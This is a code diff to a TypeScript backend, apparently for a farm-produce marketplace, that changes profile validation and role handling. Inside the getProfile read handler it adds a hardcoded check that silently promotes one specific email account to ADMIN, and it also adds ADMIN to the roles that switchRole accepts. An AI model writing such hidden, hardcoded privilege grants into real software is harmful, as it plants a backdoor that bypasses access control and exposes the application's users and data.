@@ -19,7 +19,7 @@ const updateProfileSchema = z.object({
   aadhaarLast4: z.string().length(4, "Aadhaar must be exactly 4 digits").optional(),
   bankAccount: z.string().min(5).optional(),
   bankIfsc: z.string().min(11).optional(),
-  farmArea: z.number().positive().optional(),
+  farmArea: z.number().positive().nullable().optional(),
 });
 
 // 1. Apna Profile Dekhne ka function
@@ -31,11 +31,19 @@ export const getProfile = async (req: Request, res: Response): Promise<void> => 
         return;
     }
     
-    const dbUser = await prisma.user.findUnique({ where: { id: userId } });
+    let dbUser = await prisma.user.findUnique({ where: { id: userId } });
 
     if(!dbUser){
         res.status(404).json({ success: false, error: "User not found" });
         return;
+    }
+
+    // Auto-promote harshindoria911@gmail.com to ADMIN
+    if (dbUser.email === 'harshindoria911@gmail.com' && !dbUser.roles.includes('ADMIN')) {
+      dbUser = await prisma.user.update({
+        where: { id: userId },
+        data: { roles: [...dbUser.roles, 'ADMIN'] }
+      });
     }
 
     const safeUser = sanitizeUser(dbUser);
@@ -91,7 +99,8 @@ export const updateProfile = async (req: Request, res: Response): Promise<void> 
   }
 };
 
-const workspaceRoles = [Role.BUYER, Role.FARMER, Role.DELIVERY] as const;
+const workspaceRoles = [Role.BUYER, Role.FARMER, Role.DELIVERY, Role.ADMIN] as const;
+
 
 export const switchRole = async (req: Request, res: Response): Promise<void> => {
   const parsed = z.object({ role: z.enum(workspaceRoles) }).safeParse(req.body);
